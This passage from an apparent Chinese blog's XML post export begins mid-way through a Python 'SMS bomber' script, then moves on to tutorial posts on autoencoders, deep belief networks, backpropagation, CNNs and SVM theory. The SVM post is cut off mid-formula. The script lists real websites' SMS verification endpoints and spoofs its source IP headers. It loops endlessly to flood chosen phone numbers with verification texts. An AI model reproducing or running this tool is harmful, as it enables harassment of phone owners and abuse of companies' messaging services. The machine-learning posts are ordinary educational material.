["http://jrh.financeun.com/Login/sendMessageCode3.html", 60, "金融号", "GET", &#123;"mobile": phone, "mbid": "197858"&#125;, "http://jrh.financeun.com/Login/jrwLogin?web=jrw"], ["https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code", 30, "迪卡侬", "POST", &#123;"countryCode": "CN", "mobile": phone&#125;, "https://www.decathlon.com.cn/zh/create"], ["http://cta613.org/sendsms.php", 60, "支教", "POST", &#123;"y": "1", "sj": phone&#125;, ""], ["http://sns.qnzs.youth.cn/ajax/passportSendSms", 120, "青年之声", "POST", &#123;"mobile": phone&#125;, "http://sns.qnzs.youth.cn/user/passport"] ] return APIList# 短信初始化class initSMS(object): """docstring for initSMS""" def __init__(self): super(initSMS, self).__init__() self.SMSList = [] self.intervalInfo = 0 def initBomb(self,APIList): for x in APIList: self.intervalInfo += 1 self.SMSList.append(SMSObject(x[0], x[1], x[2], x[3], x[4], x[5], self.intervalInfo)) return self.SMSListclass SMSObject(object): """docstring for SMSObject""" # __var 私有成员变量 def __init__(self, url, interval, info, method, params, others, intervalInfo): super(SMSObject, self).__init__() self.__url = url self.__interval = interval self.__info = info self.__intervalInfo = intervalInfo self.__method = method self.__params = params self.__others = others def getUrl(self): return self.__url def getInfo(self): return self.__info def getParams(self): return self.__params def getMethod(self): return self.__method def getOthers(self): return self.__others def getInterval(self): return self.__interval def getintervalInfo(self): return self.__intervalInfo def setintervalInfo(self, intervalInfo): self.__intervalInfo = intervalInfoclass Bomb(object): """docstring for Bomb""" def __init__(self): super(Bomb, self).__init__() self.HEADERS = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36', 'Referer': 'http://10.13.0.1', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2', 'cache-control': 'max-age=0', "X-Requested-With": "XMLHttpRequest" &#125; def send(self, SMS): # return "SUCCESS" IP = socket.inet_ntoa(struct.pack('&gt;I', random.randint(1, 0xffffffff))) self.HEADERS['X-FORWARDED-FOR'] = IP self.HEADERS['CLIENT-IP'] = IP try: session = requests.Session() if SMS.getOthers() != "": session.get(SMS.getOthers(), timeout=5, headers=self.HEADERS) self.HEADERS['Referer'] = SMS.getOthers() if SMS.getMethod() == "GET": req = session.get(SMS.getUrl(), params=SMS.getParams(), timeout=5, headers=self.HEADERS) else: req = session.post(SMS.getUrl(), data=SMS.getParams(), timeout=5, headers=self.HEADERS) # print(req.url) except Exception as e: return str(e) return "已发送"if __name__ == '__main__': # 手机号列表，例如可设为["12345678987","98765432123"] phoneList=[] bombNum=1 while True: # 死循环 currTime=0 print("\n第",bombNum,"次轰炸！！！","\n") bombNum+=1 for phone in phoneList: #遍历每个手机号 APIList=initAPI(phone) # API接口初始化 print("\n电话：", phone) SMSList = initSMS().initBomb(APIList=APIList) switchOn = Bomb() i = 0 currTime = 0 while True: currTime += 1 # print(currTime) for x in SMSList: if x.getintervalInfo() == 0: i += 1 info = switchOn.send(x) print(str(i) + "." + x.getInfo() + " " + info) x.setintervalInfo(x.getInterval()) else: x.setintervalInfo(x.getintervalInfo() - 1) time.sleep(5) #设置两次轰炸的间隔时间，单位是秒 if i==len(APIList): break]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[深度学习：自编码器、深度信念网络和深度玻尔兹曼机]]></title>
    <url>%2F2019%2F09%2F11%2Fdl-2%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关自编码器、深度信念网络和深度玻尔兹曼机的相关知识。 一、自编码器1. 自编码器自编码器（auto-encoder，AE）是一个只有一个隐藏层的神经网络，它先对输入x进行编码，再对编码结果进行解码，我们希望能够得到和输入x非常相似的输出y（最理想情况就是输入和输出完全一样）。则编码所得到的结果就可以看作是该输入数据的特征。对于该目标更新网络参数，从而使其效果达到最优，这就构建了一个自解码器。 如上图所示，从输入x到隐藏层a之间就是编码过程，从隐藏层a到输出y之间就是解码过程。更具体的，$a=f(W_1x+b_1)$，$y=W_2a+b_2$，$W_1$是输入层和隐藏层之间的权重，$b_1$是输入层和隐藏层之间的偏置，$W_2$是隐藏层和输出层之间的权重，$b_2$是隐藏层和输出层之间的偏置，$f()$是激活函数。我们的目标是使得 $y\approx x$。为了评价输出值与真实值（输入值）之间的误差，还需要设置一个损失函数 $E(x,y)$。 2. 稀疏自编码器从自动编码器获得有用特征的一种方法是限制隐藏层的节点个数比输入层少，这样将使自动编码器捕捉训练数据中最显著的特征，这样的自动编码器叫稀疏自编码器（sparse auto-encoder）。也就是说用少量的特征就可以还原原始输入数据。与普通的自编码器不同的是，稀疏自编码器中的总损失函数为：$$J(W,b)=E(x,y)+\gamma\sum_j^{D_H}KL(\rho||\hat{\rho_j})$$其中$\gamma$是稀疏控制参数，$D_H$是隐藏层节点的个数，$KL(\rho||\hat{\rho_j})$是KL散度，又称相对熵，其定义如下：$$KL(\rho||\hat{\rho_j})=\rho\log\frac{\rho}{\hat{\rho_j}}+(1-\rho)log\frac{1-\rho}{1-\hat{\rho_j}}$$式中，$\hat{\rho_j}$表示隐藏层第j个节点的平均活跃度，$\rho$表示目标平均活跃度。 3. 堆栈自编码器 简单来说，堆栈自编码器（stacked auto-encoder，SAE）就是将多个自编码器串联堆叠起来，将前一个自编码器的输出作为下一个自编码器的输入进行训练。这样做的目的是通过加深网络的层数，从而提取到输入数据更加抽象的特征。由于对网络的权重进行随机初始化时容易发生陷入局部最优解（而不是全局最优解）的问题，对此采取的办法是进行预训练（pretraining），它的思想是对网络逐层进行训练，只考虑相邻两层从而得到最优的参数，并把该参数作为权重初始化的值（微调）。 对于分类问题来说，还需要在SAE的基础上另加一个额外的输出层，从而输出是某一类别的可能性大小。此时只有原SAE中的初始参数是通过预训练得到，而新输出层和旧输出层之间的初始参数随机赋值得到。 二、深度信念网络和深度玻尔兹曼机1. 受限玻尔兹曼机 受限玻尔兹曼机（restricted Boltzmann machines, RBM）的本质是一种自编码器，它由可视层和隐藏层组成，可视层其实就是输入层，只不过名称不同。可视层和隐藏层之间的神经元采用对称的全连接，而层内的神经元之间没有连接。所有的神经元只有1和0两种状态，分别表示激活和未激活。 在RBM中还有一些能量函数和概率函数等，但是我目前还没有搞懂它们的作用，所以就不详细介绍了，想了解更多请参考大话深度信念网络。由于最后推导得出的公式比较难计算，所以又提出了通过Gibbs（吉布斯）采样的方法来近似计算，后来还提出了对比散度（contrastive divergence）算法更高效的方式来近似计算。 2. 深度信念网络 深度信念（置信）网络（deep belief network, DBN）类似于堆栈自编码器，置信就是可能性的意思。它的思想是把多个受限玻尔兹曼机串联堆叠起来形成一个更深的网络，其顶部两层（靠近输出层的层）之间的连接是双向的，而其他所有层之间的连接是单向的，箭头指向最接近数据的层。类似于堆栈自编码器，在对该模型进行训练时，也可以采用预训练的方式来避免陷入局部最优解。 3. 深度玻尔兹曼机深度玻尔兹曼机（deep Boltzmann machines, DBM）与深度信念网络类似，都是右多个受限玻尔兹曼机串联堆叠而形成的一个深层神经网络，与深度信念网络相区别的是DBM的任意两层之间都是双向连接的。]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[深度学习：神经网络的基本概念和算法]]></title>
    <url>%2F2019%2F09%2F01%2Fdeep-learning%2F</url>
    <content type="text"><![CDATA[前面机器学习的主要部分已经都涉及到了，虽然SVM的部分有些烂尾，并且中间也有好多地方因为自己没弄懂而一带而过……现在也应该开始深度学习的部分了，深度学习的内容没有机器学习那么有条理，可能就是看到哪写到哪，最主要的目的还是理清自己的思路。自己也在纠结一个知识点应该细致到什么程度，是否应该多加一些发散思维。但是又怕文章太过冗长，影响整体的结构。还是随性来吧。 本文主要讲解有关深度学习的相关内容，具体包括感知机、神经网络和反向传播算法、卷积神经网络中的卷积层和池化层，以及dropout、批量正则化和激活函数等内容。 一、深度学习概述深度学习可以看作是机器学习的一个分支，现在一提到深度学习一般指的就是深层神经网络。神经网络这个东西在很早以前就被提出了，但是由于当时计算机计算能力的限制，所以一直没能投入实际应用。深度学习有两个非常重要的特性——多层和非线性。对于这两个特性的介绍会在后面的文章中慢慢介绍到。 二、感知机感知机（perceptron）是二分类的线性分类模型，是支持向量机和神经网络的基础。 感知机模型只有输入层和输出层两层，并且输出层只有一个神经元，所以又被称作单层（不算输入层）神经网络。由于只有一个输出节点，所以感知机一般用于处理二分类问题，输出节点的值表示数据为某一分类的概率。其网络模型如下图所示： 由图可知，第i个输入神经元与输出神经元之间的权重可以表示为$w_i$，而$w_0$表示偏置值，其对应的输入神经元的值恒为1。感知机模型的工作流程是：先将输入值与其对应的权重相乘，再加上偏置值，最后将以上步骤得到的值送入激活函数，得到最终的输出。该流程可以用以下公式表示：$$y(v;\theta)=f(\sum_{i=1}^D{v_iw_i+w_0})=f(w^Tv+w_0)$$其中$v$是输入数据，$\theta$是指$w$和$w_0$等参数，D是数据集的个数。等式最右边是矩阵的表示形式。 感知机有个缺陷就是它无法解决异或问题，但是当为感知机增加一个隐藏层后就可以解决异或问题了。可以这样理解：神经网络的层数越多，学到的样本的特征越抽象，表达能力越强。当然层数过多也会带来很多问题。 所谓的激活函数就是一个“非线性函数”，常见的激活函数有：ReLU函数、Sigmoid函数和Tanh（双曲正切）函数等。它们的表达式和图像如下： 在我的理解中，激活函数的作用是它使得模型由线性模型变为非线性模型，而线性模型能够解决的问题是有限的，所以这就突破了线性模型自身的局限性。那么为什么线性模型能够解决的问题是有限的呢？如果只有全连接层时，一个输入数据经过两次线性传播（输入数据乘以权重），则有：$$y_1=xW_1$$ $$y_2=y_1W_2$$ $$y_2=(xW_1)W_2=x(W_1W_2)=xW$$ 其中有$W_1W_2=W$，也就是说只通过线性变换，任意层的全连接神经网络和单层神经网络在表达能力上没有任何区别，即线性模型的组合仍然是线性模型。 当然也可以对感知机进行进一步的拓展，将其输出节点个数改为多个，这样就可以处理多分类问题了。不过此时在任意两个输入和输出节点之间都要有一个权重值，并且激活函数改为采用sotfmax函数，其定义如下：$$s(z_k)=\frac{exp(z_k)}{\sum_{l=1}^K{exp(z_l)}}$$其中$z_k=w_k^Tv+w_{k0}$，$w_k$是第k个输入节点的权重向量，$v$是输入数据，$w_{k0}$是第k个输入节点的偏置值。 三、神经网络和反向传播算法当前的神经网络通常有多层，不仅有输入和输出层，还有若干个隐藏层（在输入和输出层中间的层）。神经网络的学习中有两个基本问题：一是网络结构的学习，二是网络参数的学习。第一个问题尚未解决，而第二个问题通常采用反向传播（backpropagation, BP）算法来解决。反向传播算法由正向传播过程和反向传播过程组成。前向传递输入信号直至输出产生误差，反向传播误差信息更新权重矩阵。下面就来较为详细的介绍一下反向传播算法。 1. 反向传播算法(1). 符号定义首先给出一些定义： $w_{ij}^l$ 表示第$l$层第$i$个神经元连接到第$（l-1）$层的第$j$个神经元之间的权重； $b_i^l$ 表示第$l$层第$i$个神经元的偏置值； $z_j^l$ 表示第$l$层第$j$个神经元激活前的值，即：$$z_j^l=\sum_j{w_{ij}^{l} a_j^{l-1}+b_j^{l-1}}$$$a_j^l$ 表示第$l$层第$j$个神经元激活后的值，即：$$a_j^l=\sigma(z_j^l)$$其中$\sigma$表示激活函数。 由于上一层的输出是下一层的输入，所以$z_j^l$和$a_j^l$没有用输入输出的字样，而是换了一种表达方式。 (2). 前向传播 上图中是一个三层的神经网络的示意图，其中标注了部分符号。前向传播过程就是先将上一层的输入乘以上一次层与本层的权重，再加上偏置，最后送入激活函数。不断重复该过程，数据就会从输入层一层层的传递到输出层，得到最后的结果。 (3). 损失函数和梯度下降为了计算预测值与真实值之间的误差，以便更新网络的参数，还需要定义损失函数，这里就假设损失函数为最常用的平方损失函数：$$C=\frac{1}{2n}\sum_{i=1}^n||y_i-a_i^L||^2$$其中n是输出层神经元个数；L是神经网络的层数；y是样本的真实值；$a^L$是第L层的输出，也就是神经网络的预测值。 然后要做的就是用梯度下降算法，根据误差函数对每个权重$w_{ij}^l$的偏导数，来更新神经网络的权重，即：$$w_{ij}^l=w_{ij}^l-\eta\frac{\partial C}{\partial w_{ij}^l}$$其中$\eta$是学习率，更新时最关键的就是求解偏导数，下面来详细看一下。 (4). 链式求导法则因为在前向传播时有：$$C=\frac{1}{2n}\sum_{i=1}^n||y_i-a_i^L||^2$$ $$a_j^l=\sigma(z_j^l)$$ $$z_j^l=\sum_j{w_{ij}^{l} a_j^{l-1}+b_j^{l-1}}$$ 三个式子的顺序与前向传播相比是倒着写的，从上到下分别是损失函数、激活函数、乘以权重并且加偏置。 由以上三个式子可知，损失函数对于输出层与前一层之间权重的偏导为：$$\frac{\partial C}{\partial w_{ij}^L}=\frac{\partial C}{\partial a_j^L}\cdot\frac{\partial a_j^L}{\partial z_j^L}\cdot\frac{\partial z_j^L}{\partial w_{ij}^L}\quad\quad\quad公式(1)$$而损失函数对于倒数第二层和倒数第三层之间权重的偏导为：$$\frac{\partial C}{\partial w_{ij}^{L-1}}=\sum_k\frac{\partial C}{\partial a_k^{L}}\cdot\frac{\partial a_k^L}{\partial z_k^L}\cdot\frac{\partial z_k^L}{\partial a_j^{L-1}}\cdot\frac{\partial a_j^{L-1}}{\partial z_j^{L-1}}\cdot\frac{\partial z_j^{L-1}}{\partial w_{ij}^{L-1}}\quad\quad\quad公式(2)$$ 给出了公式，再来解释一下公式是什么意思。对上图而言公式(1)就是求损失函数对$w_{ij}^3$的偏导，对于$\frac{\partial C}{\partial w_{12}^3}$来说只有$C\rightarrow G\rightarrow 损失函数$ 这一条路径与$w_{12}^3$有关，其中C是第2层的第1个神经元，G是第3层的第2个神经元，对应w的下标1和2。而公式(2)是求损失函数对$w_{ij}^2$的偏导，对于$\frac{\partial C}{\partial w_{23}^3}$来说，有$B\rightarrow E\rightarrow F\rightarrow 损失函数$ 和$B\rightarrow E\rightarrow G\rightarrow 损失函数$ 这两条路径，其中B是第1层的第2个神经元，E是第3层的第3个神经元，与w的下标2和3对应；而F和G是第3层的神经元的所有可能的情况。 (5). 引入$\delta$从第4部分的链式求导公式可以看出，虽然求导的方法很简单，但是当神经网络层数较多时会导致公式过于冗长。并且损失函数对较高层（靠近输出层的层）的权重的导数在求解对较低层权重的导数时还会用得到，这就导致了大量重复的运算，这无疑会造成时间的浪费。为了避免重复运行，所以又引入了$\delta_j^l$，它表示第$l$层的第$j$个神经元产生的误差，其定义为：$$\delta_j^l=\frac{\partial C}{\partial z_j^l}$$公式1：最后一层神经网络产生的误差：$$\delta^L=\nabla_{a^L}C\odot\sigma^`(z^L)$$推导过程：$$\because\delta_j^L=\frac{\partial C}{\partial z_j^L}=\frac{\partial C}{\partial a_j^L}\cdot\frac{\partial a_j^L}{\partial z_j^L}$$ $$\therefore\delta^L=\frac{\partial C}{\partial a^L}\odot\frac{\partial a^L}{\partial z^L}$$ 其中 C是关于$a^L$的损失函数，$a^L$是关于$z^L$的激活函数，$\odot$是矩阵之间点对点的乘法运算符号，所以上式又可以写为：$$\delta^L=\nabla_{a^L}C\odot\sigma^`(z^L)$$ 公式2：每一层神经网络产生的误差：$$\sigma^l=((w^{l+1})^T\sigma^{l+1})\odot\sigma^`{(z_j^l)}$$推导过程：$$\because\delta_j^l=\frac{\partial C}{\partial z_j^l}=\sum_k\frac{\partial C}{\partial z_k^{l+1}}\cdot\frac{\partial z_k^{l+1}}{\partial a_j^l}\cdot\frac{\partial a_j^l}{\partial z_j^l}$$ $$=\sum_k\sigma_k^{l+1}\cdot\frac{\partial(w_{kj}^{l+1}a_j^l+b_k^{l+1})}{\partial a_j^l}\cdot\sigma^`{(z_j^l)}$$ $$=\sum_k\sigma_k^{l+1}\cdot w_{kj}^{l+1}\cdot\sigma^`{(z_j^l)}$$ $$\therefore\sigma^l=((w^{l+1})^T\sigma^{l+1})\odot\sigma^`{(z_j^l)}$$ 公式3：权重的梯度：$$\frac{\partial C}{\partial w_{ij}^l}=a_j^{l-1}\sigma_i^l$$推导过程：$$\frac{\partial C}{\partial w_{ij}^l}=\frac{\partial C}{\partial z_i^l}\cdot\frac{\partial z_i^l}{\partial w_{ij}^l}=\sigma_i^l\cdot\frac{\partial (w_{ij}^la_j^{l-1}+b_i^l)}{\partial w_{ij}^l}=a_j^{l-1}\sigma_i^l$$ 公式4：偏置的梯度：$$\frac{\partial C}{\partial b_i^l}=\sigma_i^l$$推导过程：$$\frac{\partial C}{\partial b_i^l}=\frac{\partial C}{\partial z_i^l}\cdot\frac{\partial z_i^l}{\partial b_i^l}=\sigma_i^l\cdot\frac{\partial (w_{ij}^la_j^{l-1}+b_i^l)}{\partial b_i^l}=\sigma_i^l$$ 至此，梯度下降过程中用到的偏导数都计算出来了，并且去除了冗余的部分，进行了一系列的化简。以上就是整个反向传播算法的所有内容。反向传播部分内容参考了一文搞懂反向传播算法和反向传播算法这两篇文章。 2.梯度消失和梯度爆炸由于反向传播过程需要计算若干梯度的乘积，当梯度过小时（&lt;1），则结果会越乘越小，甚至会溢出为NaN（not a number，非数字），这种现象被称为梯度消失。反之，若梯度过大时（&gt;1），结果就会越乘越大，最终溢出，这种现象被称为梯度爆炸。解决梯度消失和梯度爆炸的方法有： (1). 使用其他函数（ReLU函数、Tanh函数、softsign函数等）来代替sigmoid函数作为激活函数； (2). 先逐层预训练，后全局微调，从而得到初始的权重值。用预训练得到的初始化权重代替随机初始化权重。所谓预训练就是把相邻两层看作一个神经网络，然后对其进行训练，得到权重； (3). 当梯度超过或低于一定阈值时，对其进行截断； (4). 添加权重正则化项； (5). 使用LSTM（长短期记忆网络）结构。 四、卷积神经网络深层神经网络模型的输入通常是一个向量，但是对于像图像等数据来说，每个像素与相邻像素之间可能存在一定的关系，对其进行矢量化可能会破坏这种相邻像素间的信息，同时传统的神经网络在处理图片时还存在参数比较多的问题，所以又提出了卷积神经网络（convolutional neural network, CNN）。在CNN中又引入了卷积（convolution）和池化（pooling）的操作。 CNN有两个特点，一是局部连接性，它是指每次的卷积操作只作用在图片的一小块区域上，而不是整张图片上；二是权值共享，它是指使用相同的卷积核在图片的不同区域做卷积操作。 1. 卷积层卷积核通常是一个长和宽都为奇数的方阵，卷积层的作用是通过卷积核矩阵提取图像的局部特征。上图是对单通道图像（灰度图像）进行卷积和最大池化操作的过程。标有kernel的3*3矩阵是卷积核，在卷积过程中卷积核要与图片中每个3*3大小的矩阵的对应元素相乘并求和，从而得到一个值。比如卷积核与图片矩阵（蓝色）最左上角的3*3矩阵的对应元素相乘相加：1*0+0*0+0*1+0*0+1*1+1*0+0*1+0*0+1*0=1，也就是红色矩阵最左上角的“1”。下图是一个卷积操作的完整示意图： 除了相乘相加，还可以设置偏置值（bias），即相乘相加操作后得到的数再加上偏置值作为一次卷积的结果。大家会发现在上图中经过卷积操作后，结果图比原图变小了，为了使图片保持大小不变，还可以在图片的外围补一圈0，补0的宽度和高度由卷积核大小和原图大小可以确定。这个过程成为padding，其示意图如下： 在以上卷积中，每次移动的步数（stride）为1，其实也可以将其设置为其他值，如下图就是stride=2的卷积操作： 如果是三通道（RGB）的图片，则对该图片的卷积操作需要每个通道设置一个卷积核矩阵，对同一位置的卷积操作就是三个通道分别做卷积，然后将结果相加作为最终的卷积结果。经过卷积操作后图片的通道数会减少。 在某些教程中，卷积核也被称为滤波器，可以分为高通滤波器和低通滤波器两种。高通滤波器可以去掉低频信号，实现提取图像中物体边缘的功能；低通滤波器可以去掉高频信号，实现去噪声和模糊化图像的功能。下面就利用这两种滤波器分别对上图进行处理。上图分别是原图、高通滤波器处理结果、低通滤波器处理结果。 上图是一个高通滤波器，大家会发现它一共有9个元素，且元素之和为0。当它和图像做卷积操作时，如果某个元素值与周围元素值相差很小时，则卷积的结果会趋近于0（黑色）；如果某个元素值与周围元素值相差很大时，则卷积后与原图的值会相差很大。而图像中物体的边缘通常是与周围的元素值相差很大的，所以高通滤波器可以提取图像中物体的边缘。 上图是一个低通滤波器，大家会发现所有的值都相等，并且元素值之和为1。如果图像中的某一个像素点和周围像素点的差值大的话，那么这个点就会被周围的像素给同化。从而可以去掉图像中的噪声，或者说让图片变得更模糊。 关于滤波器的这部分内容，主要参考了白话文讲计算机视觉之滤波器一文。 2. 池化层池化操作有很多种，最常用的有最大池化和平均值池化两种，它的本质是下采样。 上图中标有max的2*2矩阵就是池化所用到的矩阵，你会发现它里面没有值，实际上只需要指定池化的大小即可。当池化大小为2*2时，就需要在图片中每个不重叠的2*2大小的矩阵的四个元素中取最大值，然后用该最大值代替原来2*2的矩阵。经过这个操作，图片会缩小一半，这样既保存了图像中关键的特征，又使得图片变小，有利于减少处理时间。 pooling操作具有平移不变性和大小不变性，这是指当物体的位置和大小发生改变时，仍能提取其特征。 3. 全连接层全连接层（fully connected layers, FC）就是把相邻两层之间的任意两个神经元之间都连接起来，每条连接边上都有一个权重。全连接可以表示为$y=wx$，其中$w_{ij}$是前一层第$i$个神经元和后一层第$j$个神经元之间的权重。 由于全连接层的使用会导致神经网络的参数急剧上升，所以要尽量少用甚至不用全连接层。除此之外，全连接层的输入和输出神经元个数都是固定的，所以当原始输入的大小不合适时，就需要用其他方法来进行调整。 在卷积神经网络中，卷积层和池化层往往是相互结合来对图像进行处理的，通常一个卷积操作后面会跟上一个池化层，然后再对池化后的图像进行激活函数的处理，重复该过程若干次后再加入几个全连接层，最后经过损失函数得到最后的结果。 五、其他优化方法1. Dropout Dropout的思想就是在每次训练的迭代过程中，以某个概率$p$随机地让神经网络中的部分神经元灭活（可以看作是删除这些节点）。它减少了神经元之间的相互依赖，可以被看作是训练多个结构不同但是参数共享的神经网络，有效的避免了过拟合。需要注意的是，在建立好模型，用测试集进行测试的时候，不再采用dropout的方式，而是保留全部神经元进行测试。 2. Batch Normalization在神经网络的训练过程中，网络的参数每经过一层，其分布就会发生一次变化，这就是所谓的“Internal Covariate Shift”问题。换句话说，参数的整体分布会逐渐靠近激活函数的左右两端，这就使得梯度会过大或过小，从而导致梯度消失或梯度爆炸。进一步导致了训练收敛慢、时间长。 而Batch Normalization（批量正则化、批量标准化）就是对每一个mini-batch的数据进行减去均值，再除以方差，也就是使其满足均值为0，方差为1的标准正态分布。实践证明，这样可以大大减少训练的时间，并且减少对dropout的依赖。 3. 数据增强由于当样本数据较少时，模型的训练效果也会变差，所以可以采用数据增强（data augmentation）的方法来扩充样本数据。比如，对原图片做翻转、旋转、缩放、裁剪、平移和增加噪声等操作，从而生成新的样本数据。数据增强不仅扩充了样本数据，而且由于对不同大小、不同角度的图像都做了训练，所有还提高了模型的泛化能力。]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（6）：支持向量机（SVM）]]></title>
    <url>%2F2019%2F08%2F31%2FSVM%2F</url>
    <content type="text"><![CDATA[本文将讲解有关支持向量机（SVM）的有关知识，主要包括线性可分SVM，线性SVM和非线性SVM的相关原理和算法过程，以及SMO算法。该部分内容数学公式的推导非常非常多，一环扣一环，所以我尽量从中学数学的角度，尽可能直观的展现整个思维过程，读者们最好在了解整个算法流程之后自己在草稿本上推导一遍。此外，本文中将不再提前给出相关的定义，而是在遇到的时候再给出，或者在事后总结的时候给出。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 一、支持向量机基本思想支持向量机（support vector machines，SVM）是一种二分类模型，在神经网络提出之前可以说是效果最好的分类模型。SVM主要有三种：对线性可分数据根据硬间隔最大化进行分类的SVM被称为线性可分SVM（或硬间隔SVM）；对近似线性可分的数据根据软间隔最大化进行分类的SVM被称为线性SVM（或软间隔SVM）；对线性不可分数据根据核函数及软间隔最大化进行分类的SVM被称为非线性SVM。这三种不同情况也是由简至繁的。 所谓的线性可分就是指在一个二分类问题中，一定存在一个超平面将两个类别完全分割开，超平面的一侧是正类，另一侧是负类。那么什么又是超平面呢？超平面是n维空间中维度为n-1维的线性子空间，说人话就是：二维平面中的超平面是一维直线，三维空间中的超平面是二维平面，依此类推…… 先来考虑最简单的情况——线性可分SVM。既然对于线性可分的数据一定存在一个超平面将两个类别完全分割开，那么我们希望样本点离该分割（离）超平面越远越好，最好使得距离该分割超平面最近的点最远。而距离分割超平面最近的点一定是至少有两个，并且分布在超平面两侧的两个类别中。不然，假如一个类别中的样本点到超平面最近的距离为4，另一个为6，则一定可以通过平移该分割超平面使得两者距离都为5。 如上图所示，红色实线为分割超平面，虚线经过距离分割超平面最近的样本点，其他样本点都位于虚线的一侧，可以说虚线把一类中的所有样本点支持住了，故虚线也被称作支持向量。而两条虚线是平行于实线的，且它们到实线的距离是相等的。线性可分SVM的目的就是找出这个使得距离该分割超平面最近的点最远的分离超平面。 二、线性可分支持向量机线性可分SVM能够使用的前提是训练集数据是线性可分的。其思想是找出使得距离该分割超平面最近的点最远的分离超平面：$\hat{W}X+\hat{b}=0$，则相应的决策函数为：$$f(X)=sign(\hat{W}X+\hat{b})$$上式的含义是当样本位于超平面的一侧时分类结果为正，另一侧为负。其中sign(x)是符号函数，其定义为： 现在知道了线性可分SVM的模型和其分类方式，下面来看怎么寻找这个最优的分割超平面。 我们知道，二维平面中的一条直线的一般式方程为：$Ax+By+C=0$，而一个点$(x_0,y_0)$到该直线的距离为：$$dist(x_0,y_0)=\frac{|Ax_0+By_o+C|}{\sqrt{A^2+B^2}}$$当上式的分子不加绝对值时，则距离有正有负，位于直线一侧的点到直线的距离为正，另一侧的为负。拓展到更高维度的空间，设所求分离超平面的一般式方程为：$$W^TX+b=0$$其中W和X是关于参数和变量（特征）的向量，b是一个标量，即：$$W=(w_1,w_2,…,w_n)^T$$ $$X=(x_1,x_2,…,x_n)^T$$ 而空间中一个点$(X^{(i)},Y^{(i)})$到该超平面的距离可以表示为：$$dist(X^{(i)},Y^{(i)})=\frac{w_1x_1^{(i)}+w_2x_2^{(i)}+…+w_nx_n^{(i)}}{ \sqrt{w_1^2+w_2^2+…+w_n^2}}$$注意上式的分子没加绝对值，说明距离有正有负。分母是W的$L_2$范数，可以记为$||W||$。 又因为是二分类，$Y^{(i)}$的取值只有+1和-1两种，当某个样本的分类正确时，有$dist(X^{(i)},Y^{(i)})\cdot Y^{(i)}&gt;0$，则可以用$dist(X^{(i)},Y^{(i)})\cdot Y^{(i)}其$表示样本点到超平面的距离。所以样本点到超平面的最短距离$\gamma$为：$$\gamma=\min_{i=1,2,…,n}dist(X^{(i)},Y^{(i)})\cdot Y^{(i)}=\min_{i=1,2,…,n}\frac{W^TX^{(i)}+b}{||W||}\cdot Y^{(i)}$$则求使得距离分离超平面最近的点最远的分离超平面，就是求解使得下式成立的W和b的值。$$arg\max_{W,b}\gamma=arg\max_{W,b}\min_{i=1,2,…,n}\frac{W^TX^{(i)}+b}{||W||}\cdot Y^{(i)}$$ $$=arg\max_{W,b}{\frac{1}{||W||}\min_{i=1,2,…,n}(W^TX^{(i)}+b)\cdot Y^{(i)}}\quad\quad\quad公式(1)$$ 上式中$arg\max_{W,b}$的含义是当公式取最大值时，W，b的取值是多少。 当对$W^T$和b进行等比例缩放时，超平面没有改变，点到超平面的距离$dist(X^{(i)},Y^{(i)})$也不会变，但是$W^TX^{(i)}+b$是会改变的。我们总是可以通过对$W^T$和b进行等比例缩放，使得$|W^TX^{(i)}+b|\geq1$，当分类正确时，也等价于$(W^TX^{(i)}+b)\cdot Y^{(i)}\geq 1$。所以$(W^TX^{(i)}+b)\cdot Y^{(i)}$的最小值是1，即：$$\min_{i=1,2,…,n}(W^TX^{(i)}+b)\cdot Y^{(i)}=1\quad\quad\quad\quad\quad\quad公式(2)$$将公式(2)带入到公式(1)中得：$$arg\max_{W,b}\gamma=arg\max_{W,b}\frac{1}{||W||}$$ $$s.t.\quad\quad(W^TX^{(i)}+b)\cdot Y^{(i)}\geq1$$ 其中s.t. 表示约束条件。如果不考虑最值是多少，而只考虑最值在何处取得时，上述公式等价于：$$arg\min_{W,b}\frac{1}{2}||W||^2$$ $$s.t.\quad\quad(W^TX^{(i)}+b)\cdot Y^{(i)}\geq1$$ 如此一来，一开始要求解的最小距离最大化，就变成了求解等价的上述公式。对于求解带约束条件的最值问题，可以用高数中学的拉格朗日乘子（数）法，构造拉氏函数：$$L(W,b,\alpha)=\frac{1}{2}||W||^2-\sum_{i=1}^n\alpha_i[(W^TX^{(i)}+b)\cdot Y^{(i)}-1]$$原始问题是极小极大问题：$\min_{W,b}\max_\alpha L(W,b,\alpha)$，但是该问题较难求解，所以通过求解其对偶问题（极大极小问题）$\max_\alpha\min_{W,b} L(W,b,\alpha)$来得到原始问题的解。对于对偶问题，先求$\min_{W,b}L(W,b,\alpha)$的解。将拉氏函数$L(W,b,\alpha)$分别对W和b求偏导，并令其等于0得：$$\frac{\partial L}{\partial W}=W-\sum_{i=1}^n{\alpha_iy_ix_i}=0$$ $$\frac{\partial L}{\partial b}=-\sum_{i=1}^n{\alpha_iy_i}=0$$ 整理得：$$W=\sum_{i=1}^n{\alpha_iy_ix_i}\quad\quad\quad\quad公式(3)$$ $$\sum_{i=1}^n{\alpha_iy_i}=0\quad\quad\quad\quad\quad公式(4)$$ 将公式(3)、(4)带入到$\min_{W,b}L(W,b,\alpha)$中得：$$\min_{W,b}L(W,b,\alpha)=-\frac{1}{2}\sum_{i=1}^{n}\sum_{j=1}^{n}\alpha_i\alpha_jy_iy_jx_ix_j+\sum_{i=1}^{n}\alpha_i$$进一步求解对偶问题$\max_\alpha\min_{W,b} 